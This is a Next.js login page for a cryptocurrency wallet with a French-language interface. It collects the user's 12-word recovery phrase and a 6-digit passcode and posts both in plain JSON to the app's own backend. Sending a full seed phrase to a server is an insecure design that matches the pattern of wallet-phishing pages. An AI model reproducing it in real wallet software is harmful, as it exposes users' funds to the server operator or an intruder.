"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import ScreenHeader from "@/components/ScreenHeader";
import PasscodePad from "@/components/PasscodePad";

export default function LoginPage() {
  const router = useRouter();
  const [step, setStep] = useState<"seed" | "passcode">("seed");
  const [seedPhrase, setSeedPhrase] = useState("");
  const [seedError, setSeedError] = useState("");
  const [error, setError] = useState("");
  const [padKey, setPadKey] = useState(0);
  const [busy, setBusy] = useState(false);

  const submitSeed = (e: React.FormEvent) => {
    e.preventDefault();
    const words = seedPhrase.trim().toLowerCase().split(/\s+/);
    if (words.length !== 12) {
      setSeedError("La phrase doit contenir exactement 12 mots.");
      return;
    }
    setSeedError("");
    setError("");
    setStep("passcode");
  };

  const onPasscode = async (passcode: string) => {
    setBusy(true);
    try {
      const res = await fetch("/api/auth/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ seedPhrase: seedPhrase.trim().toLowerCase(), passcode }),
      });
      if (res.ok) {
        router.replace("/dashboard");
        return;
      }
      const data = await res.json();
      setError(data.error ?? "Erreur serveur");
      setPadKey((k) => k + 1);
    } catch {
      setError("Erreur de connexion au serveur");
      setPadKey((k) => k + 1);
    } finally {
      setBusy(false);
    }
  };

  if (step === "passcode") {
    return (
      <div className="flex min-h-dvh flex-col">
        <ScreenHeader onBack={() => { setStep("seed"); setError(""); }} />
        <PasscodePad
          key={padKey}
          title="Entrez votre code d'accès"
          subtitle="Saisissez votre code à 6 chiffres."
          error={error}
          busy={busy}
          onComplete={onPasscode}
        />
      </div>
    );
  }

  return (
    <form onSubmit={submitSeed} className="flex min-h-dvh flex-col">
      <ScreenHeader backHref="/welcome" />
      <div className="flex-1 px-6">
        <h1 className="text-2xl font-bold">Restaurer votre wallet</h1>
        <p className="mt-2 text-sm leading-relaxed text-kb-muted">
          Saisissez les 12 mots de votre phrase secrète, séparés par des espaces.
        </p>
        <textarea
          autoFocus
          autoCapitalize="none"
          autoCorrect="off"
          spellCheck={false}
          value={seedPhrase}
          onChange={(e) => setSeedPhrase(e.target.value)}
          placeholder="mot1 mot2 mot3 mot4 mot5 mot6 mot7 mot8 mot9 mot10 mot11 mot12"
          rows={4}
          className={`tw-input mt-6 resize-none font-mono text-[15px] leading-relaxed ${seedError ? "!border-kb-red" : ""}`}
        />
        {seedError && <p className="mt-2 text-sm text-kb-red">{seedError}</p>}
      </div>
      <div className="safe-bottom px-6 pb-8">
        <button type="submit" className="btn-primary" disabled={!seedPhrase.trim()}>
          Continuer
        </button>
      </div>
    </form>
  );
}
